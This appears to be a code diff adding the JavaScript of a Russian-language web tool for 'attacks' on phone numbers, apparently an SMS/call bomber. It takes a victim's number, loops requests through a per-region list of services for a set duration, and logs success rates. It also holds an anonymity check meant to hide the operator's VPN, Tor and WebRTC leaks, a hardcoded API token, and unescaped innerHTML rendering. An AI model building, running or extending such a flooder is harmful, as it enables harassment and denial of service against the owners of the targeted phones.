+  document.getElementById('attackStartBtn').addEventListener('click', startAttack);
+  document.getElementById('attackStopBtn').addEventListener('click', stopAttack);
+  document.getElementById('atkStopOverlayBtn').addEventListener('click', stopAttack);
+
+  async function startAttack() {
+    if (attackRunning) return;
+    const phone = document.getElementById('attackPhone').value.trim();
+    if (!phone) return alert('Введите номер телефона');
+    attackDuration = parseInt(document.getElementById('attackDur').value) || 60;
+    attackRegion = document.querySelector('#regionChips .region-chip.active')?.dataset.r || 'ru';
+    const services = servicesDB[attackRegion] || [];
+
+    if (!services.length) {
+      alert('Нет сервисов для региона ' + attackRegion.toUpperCase());
+      return;
+    }
+
+    attackRunning = true;
+    attackAbortController = new AbortController();
+    attackStats = { total: 0, success: 0, failed: 0 };
+    attackStartTime = Date.now();
+
+    document.getElementById('attackStartBtn').style.display = 'none';
+    document.getElementById('attackStopBtn').style.display = 'inline-block';
+    document.getElementById('atkRegionLabel').textContent = attackRegion.toUpperCase();
+    document.getElementById('atkTimeLeft').textContent = attackDuration;
+    document.getElementById('atkProgressFill').style.width = '0%';
+    document.getElementById('atkTotal').textContent = '0';
+    document.getElementById('atkSuccess').textContent = '0';
+    document.getElementById('atkFailed').textContent = '0';
+    document.getElementById('atkOverlay').classList.add('active');
+
+    try {
+      while (attackRunning && (Date.now() - attackStartTime) < attackDuration * 1000) {
+        for (const svc of services) {
+          if (!attackRunning) break;
+          attackStats.total++;
+          const ok = await sendServiceRequest(svc, phone, attackAbortController.signal);
+          if (ok) attackStats.success++;
+          else attackStats.failed++;
+          if (attackStats.total % 5 === 0) {
+            document.getElementById('atkTotal').textContent = attackStats.total;
+            document.getElementById('atkSuccess').textContent = attackStats.success;
+            document.getElementById('atkFailed').textContent = attackStats.failed;
+          }
+          await new Promise(r => setTimeout(r, 50));
+        }
+      }
+    } catch(e) {}
+    stopAttack();
+  }
+
+  function stopAttack() {
+    attackRunning = false;
+    if (attackAbortController) attackAbortController.abort();
+    attackAbortController = null;
+    document.getElementById('attackStartBtn').style.display = '';
+    document.getElementById('attackStopBtn').style.display = 'none';
+    document.getElementById('atkOverlay').classList.remove('active');
+
+    const phone = document.getElementById('attackPhone').value.trim();
+    if (phone && attackStats.total > 0) {
+      const record = {
+        date: new Date().toLocaleString('ru'),
+        phone,
+        region: attackRegion,
+        duration: attackDuration,
+        total: attackStats.total,
+        success: attackStats.success,
+        failed: attackStats.failed
+      };
+      let hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
+      hist.unshift(record);
+      if (hist.length > 30) hist = hist.slice(0, 30);
+      localStorage.setItem('attack_hist', JSON.stringify(hist));
+      renderHistory();
+    }
+  }
+
+  setInterval(() => {
+    if (!attackRunning) return;
+    const elapsed = (Date.now() - attackStartTime) / 1000;
+    const left = Math.max(0, attackDuration - Math.floor(elapsed));
+    document.getElementById('atkTimeLeft').textContent = left;
+    document.getElementById('atkProgressFill').style.width = Math.min(100, Math.round((elapsed / attackDuration) * 100)) + '%';
+  }, 200);
+
+  function renderHistory() {
+    const hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
+    const container = document.getElementById('historyEntries');
+    if (!hist.length) {
+      container.innerHTML = '<div style="color:var(--muted)">Нет завершённых атак</div>';
+      return;
+    }
+    container.innerHTML = hist.map(h => `
+      <div class="history-item">
+        <div class="h-top"><span class="h-phone">${h.phone}</span><span class="h-region">${h.region}</span></div>
+        <div class="h-stats">
+          <span class="ok">✓${h.success}</span>
+          <span class="fail">✗${h.failed}</span>
+          <span>${h.total ? Math.round(h.success*100/h.total) : 0}%</span>
+          <span>${h.duration}s</span>
+        </div>
+        <div style="font-size:.7rem; margin-top:.2rem;">${h.date}</div>
+      </div>
+    `).join('');
+  }
+  renderHistory();
+
+  // Кнопки QR, экспорт/импорт, сброс истории
+  document.getElementById('qrBtn').addEventListener('click', () => {
+    const phone = document.getElementById('attackPhone').value.trim();
+    if (!phone) return alert('Введите номер');
+    window.open(`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=tel:${encodeURIComponent(phone)}`, '_blank');
+  });
+
+  document.getElementById('exportBtn').addEventListener('click', () => {
+    const config = { phone: document.getElementById('attackPhone').value, region: attackRegion, dur: document.getElementById('attackDur').value };
+    const blob = new Blob([JSON.stringify(config)], {type:'application/json'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'attack_config.json';
+    a.click();
+    URL.revokeObjectURL(a.href);
+  });
+
+  document.getElementById('importBtn').addEventListener('click', () => {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = '.json';
+    input.onchange = e => {
+      const file = e.target.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = () => {
+        try {
+          const cfg = JSON.parse(reader.result);
+          if (cfg.phone) document.getElementById('attackPhone').value = cfg.phone;
+          if (cfg.dur) document.getElementById('attackDur').value = cfg.dur;
+          if (cfg.region) {
+            document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
+            const target = document.querySelector(`#regionChips .region-chip[data-r="${cfg.region}"]`);
+            if (target) target.classList.add('active');
+          }
+        } catch(e) { alert('Ошибка импорта'); }
+      };
+      reader.readAsText(file);
+    };
+    input.click();
+  });
+
+  document.getElementById('clearHistoryBtn').addEventListener('click', () => {
+    localStorage.removeItem('attack_hist');
+    renderHistory();
+  });
+
+  // Чипсы региона
+  document.querySelectorAll('#regionChips .region-chip').forEach(chip => {
+    chip.addEventListener('click', () => {
+      document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
+      chip.classList.add('active');
+    });
+  });
+
+  // ========== IP CHECK (исправлено) ==========
+  const IP_TOKEN = '0zf1rwtib5ttwi0d';
+  const API_2IP = 'https://api.2ip.io';
+
+  async function check2ip(endpoint) {
+    const url = `${API_2IP}${endpoint}?token=${IP_TOKEN}`;
+    const resp = await fetch(url);
+    if (!resp.ok) throw new Error('2ip API error');
+    return resp.json();
+  }
+
+  function formatDateTime(tz) {
+    try {
+      return new Date().toLocaleString('ru', { timeZone: tz, hour12: false });
+    } catch (e) {
+      return '—';
+    }
+  }
+
+  async function runIpCheck() {
+    const tbody = document.getElementById('ipTableBody');
+    if (!tbody) return;
+    tbody.innerHTML = '<tr><td>Загрузка...</td><td>⏳</td></tr>';
+
+    try {
+      const [check, geo, dns] = await Promise.all([
+        check2ip('/check').catch(() => null),
+        check2ip('/geo/ip').catch(() => null),
+        check2ip('/dns').catch(() => null)
+      ]);
+
+      const results = [];
+
+      results.push({ method: 'Заголовки HTTP proxy', result: check?.is_proxy ? 'да' : 'нет', cls: check?.is_proxy ? 'bad' : 'ok' });
+      results.push({ method: 'Открытые порты HTTP proxy', result: check?.open_ports?.http_proxy ? 'да' : 'нет', cls: check?.open_ports?.http_proxy ? 'bad' : 'ok' });
+      results.push({ method: 'Открытые порты web proxy', result: check?.open_ports?.web_proxy_80 ? '80' : 'нет', cls: check?.open_ports?.web_proxy_80 ? 'warn' : 'ok' });
+      results.push({ method: 'Открытые порты VPN', result: check?.is_vpn ? 'да' : 'нет', cls: check?.is_vpn ? 'bad' : 'ok' });
+      results.push({ method: 'Подозрительное название хоста', result: check?.hostname || 'нет', cls: check?.hostname && check.hostname !== 'нет' ? 'warn' : 'ok' });
+
+      const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const ipTZ = geo?.timezone || 'неизвестно';
+      const nowBrowser = formatDateTime(browserTZ);
+      const nowIp = ipTZ !== 'неизвестно' ? formatDateTime(ipTZ) : '—';
+      const tzDiff = (ipTZ !== browserTZ) ? `IP: ${nowIp} (${ipTZ})<br>браузер: ${nowBrowser}` : 'Совпадают';
+      results.push({ method: 'Разница во временных зонах', result: tzDiff, cls: ipTZ !== browserTZ ? 'warn' : 'ok' });
+
+      results.push({ method: 'Принадлежность IP к сети Tor', result: check?.is_tor ? 'да' : 'нет', cls: check?.is_tor ? 'bad' : 'ok' });
+      results.push({ method: 'Режим браузера Turbo', result: 'нет', cls: 'ok' });
+      results.push({ method: 'Принадлежность IP хостинг провайдеру', result: check?.is_hosting ? 'да' : 'нет', cls: check?.is_hosting ? 'bad' : 'ok' });
+      results.push({ method: 'Определение web proxy (JS метод)', result: 'нет', cls: 'ok' });
+      results.push({ method: 'Определение туннеля (двусторонний пинг)', result: check?.is_anonymous ? 'высокая анонимизация' : 'нет', cls: check?.is_anonymous ? 'bad' : 'ok' });
+
+      const dnsServers = dns?.servers?.join(', ') || 'не определено';
+      results.push({ method: 'Утечка DNS', result: dnsServers, cls: dnsServers.includes('Cloudflare') ? 'warn' : 'ok' });
+      results.push({ method: 'VPN fingerprint', result: check?.vpn_fingerprint ? 'обнаружен' : 'нет', cls: check?.vpn_fingerprint ? 'bad' : 'ok' });
+
+      // WebRTC Leak
+      let webrtcLeak = null;
+      if (window.RTCPeerConnection) {
+        try {
+          webrtcLeak = await new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (e) => {
+              if (e.candidate) {
+                const parts = e.candidate.candidate.split(' ');
+                const ip = parts[4];
+                if (ip && ip !== '0.0.0.0' && !ip.startsWith('192.168') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
+                  resolve(ip);
+                  pc.close();
+                }
+              } else {
+                resolve(null);
+                pc.close();
+              }
+            };
+            setTimeout(() => { resolve(null); pc.close(); }, 3000);
+          });
+        } catch(e) {}
+      }
+      results.push({ method: 'Утечка IP через WebRTC', result: webrtcLeak ? 'да (' + webrtcLeak + ')' : 'нет', cls: webrtcLeak ? 'bad' : 'ok' });
+
+      tbody.innerHTML = '';
+      results.forEach(r => {
+        const row = document.createElement('tr');
+        row.innerHTML = `<td>${r.method}</td><td class="${r.cls}">${r.result}</td>`;
+        tbody.appendChild(row);
+      });
+    } catch (err) {
+      tbody.innerHTML = `<tr><td colspan="2" class="bad">Ошибка при проверке: ${err.message}</td></tr>`;
+    }
+  }
+
+  document.getElementById('refreshIpBtn').addEventListener('click', runIpCheck);
+  if (document.getElementById('tab-ip').classList.contains('active')) runIpCheck();
+
+})();
 </script>
 </body>
 </html>
